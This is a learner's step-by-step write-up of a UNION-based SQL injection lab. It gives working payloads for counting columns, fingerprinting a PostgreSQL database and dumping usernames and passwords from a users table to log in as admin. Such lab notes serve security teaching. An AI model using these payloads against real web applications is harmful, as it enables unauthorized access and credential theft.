# Lab 09 – SQLi (UNION): Retrieving data from other tables

**Goal:**  
Use a UNION-based SQL injection to find the database type/version, confirm column count & types, then retrieve data from another table (the `users` table) and use it to log in.

---

## What I did (step-by-step, exactly how I did it)
- I tried this injection `'--` in the category param to confirm there was a vuln.
- **Find column count (ORDER BY)**  
`' ORDER BY 2--` -> 200 OK 
`' ORDER BY 3--` -> error  
there are **2 columns**
- check which column types accept text
tested a simple UNION with strings:
     ```
     ' UNION SELECT 'a','b'-- 
     ```
worked, so text is allowed.
- figure out DB type / version  
tried DB-specific version payloads:
     ```
     ' UNION SELECT @@version, NULL--    # MySQL / MSSQL style -> error
     ' UNION SELECT version(), NULL--    # PostgreSQL style -> 200 OK
     ```
now i know its postgreSQL: PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)
- dump the users table
the lab said the DB has a `users` table with `username` and `password` columns, so I went straight for it:
     ```
     ' UNION SELECT username, password FROM users-- 
     ```
this returned rows including the admin credentials.

- logged in

## Notes / gotchas (for me later)
- `ORDER BY` is a fast way to get column count.  
- `UNION SELECT 'a','b'--` is quick to test whether text will display.  
- If `@@version` errors but `version()` works -> you’re probably on PostgreSQL.  
- If the lab says a table named `users` exists, use it directly (saves time).  

